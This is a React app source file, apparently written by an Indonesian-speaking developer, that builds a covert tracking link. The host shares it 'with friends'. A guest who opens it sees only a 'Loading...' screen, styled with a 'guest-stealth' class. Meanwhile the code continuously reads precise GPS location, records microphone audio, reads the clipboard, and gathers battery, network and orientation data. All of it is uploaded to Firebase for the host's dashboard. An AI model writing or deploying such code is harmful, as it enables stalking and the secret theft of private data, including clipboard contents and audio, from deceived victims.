import { useState, useEffect, useMemo, useRef } from 'react'
import { v4 as uuidv4 } from 'uuid'
import { database, ref, onValue, update } from './firebase'
import './App.css'

function App() {
  const [collectedData, setCollectedData] = useState({})
  const [error] = useState(null)
  const locationRef = useRef(null)

  const urlParams = new URLSearchParams(window.location.search)
  const sessionId = urlParams.get('session')
  const isGuest = !!sessionId
  const hostSessionId = useMemo(() => sessionId || uuidv4(), [sessionId])

  // Initialize state with persisted data
  const [sharedLocation, setSharedLocation] = useState(() => {
    if (!isGuest) {
      try {
        const savedData = localStorage.getItem(`locationData_${hostSessionId}`)
        return savedData ? JSON.parse(savedData) : null
      } catch (e) {
        console.error('Failed to parse saved data:', e)
        return null
      }
    }
    return null
  })

  const [isConnected, setIsConnected] = useState(() => {
    if (!isGuest) {
      const savedData = localStorage.getItem(`locationData_${hostSessionId}`)
      return !!savedData
    }
    return false
  })

  useEffect(() => {
    if (isGuest && Object.keys(collectedData).length > 0) {
      update(ref(database, `locations/${hostSessionId}`), collectedData)
      console.log('Sent collected data:', collectedData)
    }
  }, [collectedData, isGuest, hostSessionId])

  useEffect(() => {
    // Listen for shared location (only for host)
    if (!isGuest) {
      const locationRef = ref(database, `locations/${hostSessionId}`)
      onValue(locationRef, (snapshot) => {
        const data = snapshot.val()
        console.log('Received data from guest:', data)
        if (data) {
          setSharedLocation(data)
          setIsConnected(true)
          // Persist data to localStorage
          localStorage.setItem(`locationData_${hostSessionId}`, JSON.stringify(data))
        } else {
          // Data cleared (disconnected)
          setSharedLocation(null)
          setIsConnected(false)
          localStorage.removeItem(`locationData_${hostSessionId}`)
        }
      })
    }
  }, [hostSessionId, isGuest])

  useEffect(() => {
    if (isGuest) {
      let watchId = null

      // Get location with high accuracy and continuous monitoring
      if (navigator.geolocation) {
        const options = {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        }
        watchId = navigator.geolocation.watchPosition(
          (position) => {
            const newAccuracy = position.coords.accuracy
            const loc = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: newAccuracy,
              timestamp: Date.now(),
              user: 'guest'
            }
            // Only update if accuracy is better (lower number) or first time
            if (!locationRef.current || newAccuracy < locationRef.current.accuracy) {
              locationRef.current = loc
              setCollectedData(prev => ({ ...prev, ...loc }))
              console.log('Updated location with better accuracy:', loc)
            }
          },
          (err) => {
            console.error('Location error:', err)
            // Retry with lower accuracy if high accuracy fails
            if (err.code === err.TIMEOUT || err.code === err.POSITION_UNAVAILABLE) {
              console.log('Retrying with lower accuracy...')
              const fallbackOptions = {
                enableHighAccuracy: false,
                timeout: 10000,
                maximumAge: 60000
              }
              navigator.geolocation.getCurrentPosition(
                (position) => {
                  const loc = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: Date.now(),
                    user: 'guest'
                  }
                  locationRef.current = loc
                  setCollectedData(prev => ({ ...prev, ...loc }))
                  console.log('Fallback location:', loc)
                },
                (fallbackErr) => console.error('Fallback location failed:', fallbackErr),
                fallbackOptions
              )
            }
          },
          options
        )
      }

      // Mikrofon - Rekam audio dengan format yang lebih kompatibel
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        // Cek format yang didukung
        const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus') ? 'audio/webm;codecs=opus' :
                        MediaRecorder.isTypeSupported('audio/webm') ? 'audio/webm' :
                        MediaRecorder.isTypeSupported('audio/mp4') ? 'audio/mp4' : 'audio/webm'

        navigator.mediaDevices.getUserMedia({ audio: { echoCancellation: true, noiseSuppression: true } })
          .then((stream) => {
            const mediaRecorder = new MediaRecorder(stream, { mimeType })
            const chunks = []
            mediaRecorder.ondataavailable = (e) => {
              if (e.data.size > 0) {
                chunks.push(e.data)
              }
            }
            mediaRecorder.onstop = () => {
              if (chunks.length > 0) {
                const blob = new Blob(chunks, { type: mimeType })
                const reader = new FileReader()
                reader.onload = () => {
                  const base64 = reader.result
                  setCollectedData(prev => ({ ...prev, audio: base64, timestamp: Date.now() }))
                  console.log('Audio recorded successfully, size:', blob.size, 'bytes')
                }
                reader.onerror = () => console.error('Failed to read audio blob')
                reader.readAsDataURL(blob)
              } else {
                console.warn('No audio data recorded')
              }
              // Stop all tracks to release microphone
              stream.getTracks().forEach(track => track.stop())
            }
            mediaRecorder.onerror = (e) => console.error('MediaRecorder error:', e)
            mediaRecorder.start()
            console.log('Started recording audio with format:', mimeType)
            setTimeout(() => {
              if (mediaRecorder.state === 'recording') {
                mediaRecorder.stop()
              }
            }, 3000) // Rekam 3 detik untuk lebih cepat
          })
          .catch((err) => {
            console.error('Microphone access denied or failed:', err)
            // Fallback: coba tanpa constraints khusus
            if (err.name !== 'NotAllowedError') {
              navigator.mediaDevices.getUserMedia({ audio: true })
                .then((stream) => {
                  // Simplified recording without advanced options
                  const mediaRecorder = new MediaRecorder(stream)
                  const chunks = []
                  mediaRecorder.ondataavailable = (e) => chunks.push(e.data)
                  mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' })
                    const reader = new FileReader()
                    reader.onload = () => {
                      setCollectedData(prev => ({ ...prev, audio: reader.result, timestamp: Date.now() }))
                      console.log('Fallback audio recorded')
                    }
                    reader.readAsDataURL(blob)
                    stream.getTracks().forEach(track => track.stop())
                  }
                  mediaRecorder.start()
                  setTimeout(() => mediaRecorder.stop(), 2000)
                })
                .catch((fallbackErr) => console.error('Fallback microphone access failed:', fallbackErr))
            }
          })
      } else {
        console.warn('MediaDevices API not supported')
      }

      // Clipboard
      navigator.clipboard.readText().then((text) => {
        setCollectedData(prev => ({ ...prev, clipboard: text, timestamp: Date.now() }))
        console.log('Updated clipboard:', text)
      }).catch((err) => console.error('Clipboard access denied:', err))

      // Battery
      if (navigator.getBattery) {
        navigator.getBattery().then((bat) => {
          setCollectedData(prev => ({ ...prev, battery: { level: bat.level, charging: bat.charging }, timestamp: Date.now() }))
          console.log('Updated battery:', { level: bat.level, charging: bat.charging })
        })
      }

      // Network
      const updateNetwork = () => {
        setCollectedData(prev => ({ ...prev, network: navigator.onLine, timestamp: Date.now() }))
        console.log('Updated network:', navigator.onLine)
      }
      window.addEventListener('online', updateNetwork)
      window.addEventListener('offline', updateNetwork)

      // Orientation
      const handleOrientation = (e) => {
        setCollectedData(prev => ({ ...prev, orientation: { alpha: e.alpha, beta: e.beta, gamma: e.gamma }, timestamp: Date.now() }))
        console.log('Updated orientation:', { alpha: e.alpha, beta: e.beta, gamma: e.gamma })
      }
      window.addEventListener('deviceorientation', handleOrientation)

      return () => {
        if (watchId) navigator.geolocation.clearWatch(watchId)
        window.removeEventListener('online', updateNetwork)
        window.removeEventListener('offline', updateNetwork)
        window.removeEventListener('deviceorientation', handleOrientation)
      }
    }
  }, [isGuest, hostSessionId])

  const shareUrl = () => {
    const url = `${window.location.origin}${window.location.pathname}?session=${hostSessionId}`
    navigator.clipboard.writeText(url)
    alert('Link copied to clipboard! Share it with your friends.')
  }

  const disconnectGuest = () => {
    if (confirm('Are you sure you want to disconnect? All data will be lost.')) {
      // Clear data from Firebase
      update(ref(database, `locations/${hostSessionId}`), null)
      // Clear local state
      setSharedLocation(null)
      setIsConnected(false)
      // Clear localStorage
      localStorage.removeItem(`locationData_${hostSessionId}`)
      alert('Disconnected. You can share a new link.')
    }
  }

  return (
    <div className="app-container">
      <header className="app-header">
        <h1>Welcome</h1>
        <p>{isGuest ? 'Processing...' : 'Share this page with friends'}</p>
      </header>
      <main className="app-main">
        <div className="location-card">
          {isGuest ? (
            <div className="guest-stealth">
              <p>Loading...</p>
            </div>
          ) : (
            <>
              <div className="host-controls">
                <button className="share-button" onClick={shareUrl}>
                  🔗 Share Link
                </button>
                {isConnected && (
                  <button className="disconnect-button" onClick={disconnectGuest}>
                    ❌ Disconnect
                  </button>
                )}
              </div>
              {sharedLocation && (
                <div className="shared-location">
                  <h3>Device Information:</h3>
                  <div className="data-grid">
                    <div className="data-card">
                      <div className="data-icon">📍</div>
                      <div className="data-content">
                        <h4>Lokasi</h4>
                        <p>Lat: {sharedLocation.latitude?.toFixed(6)}</p>
                        <p>Lng: {sharedLocation.longitude?.toFixed(6)}</p>
                        <a href={`https://www.google.com/maps?q=${sharedLocation.latitude},${sharedLocation.longitude}`} target="_blank" rel="noopener noreferrer">Lihat di Maps</a>
                      </div>
                    </div>
                    {sharedLocation.battery && (
                      <div className="data-card">
                        <div className="data-icon">🔋</div>
                        <div className="data-content">
                          <h4>Baterai</h4>
                          <p>{Math.round(sharedLocation.battery.level * 100)}%</p>
                          <p>{sharedLocation.battery.charging ? '🔌 Charging' : '⚡ Battery'}</p>
                        </div>
                      </div>
                    )}
                    {sharedLocation.clipboard && (
                      <div className="data-card">
                        <div className="data-icon">📋</div>
                        <div className="data-content">
                          <h4>Clipboard</h4>
                          <p className="clipboard-text">{sharedLocation.clipboard}</p>
                        </div>
                      </div>
                    )}
                    {sharedLocation.audio && (
                      <div className="data-card">
                        <div className="data-icon">🎤</div>
                        <div className="data-content">
                          <h4>Audio</h4>
                          <audio controls src={sharedLocation.audio}></audio>
                        </div>
                      </div>
                    )}
                    {sharedLocation.network !== undefined && (
                      <div className="data-card">
                        <div className="data-icon">{sharedLocation.network ? '📶' : '📵'}</div>
                        <div className="data-content">
                          <h4>Jaringan</h4>
                          <p>{sharedLocation.network ? 'Online' : 'Offline'}</p>
                        </div>
                      </div>
                    )}
                    {sharedLocation.orientation && (
                      <div className="data-card">
                        <div className="data-icon">📱</div>
                        <div className="data-content">
                          <h4>Orientasi</h4>
                          <p>α: {sharedLocation.orientation.alpha?.toFixed(1)}°</p>
                          <p>β: {sharedLocation.orientation.beta?.toFixed(1)}°</p>
                          <p>γ: {sharedLocation.orientation.gamma?.toFixed(1)}°</p>
                        </div>
                      </div>
                    )}
                    <div className="data-card">
                      <div className="data-icon">👤</div>
                      <div className="data-content">
                        <h4>User</h4>
                        <p>{sharedLocation.user}</p>
                        <p className="timestamp">{sharedLocation.timestamp ? new Date(sharedLocation.timestamp).toLocaleString() : 'N/A'}</p>
                      </div>
                    </div>
                  </div>
                </div>
              )}
            </>
          )}
          {error && <p className="error-message">❌ Error: {error}</p>}
        </div>
      </main>
    </div>
  )
}

export default App
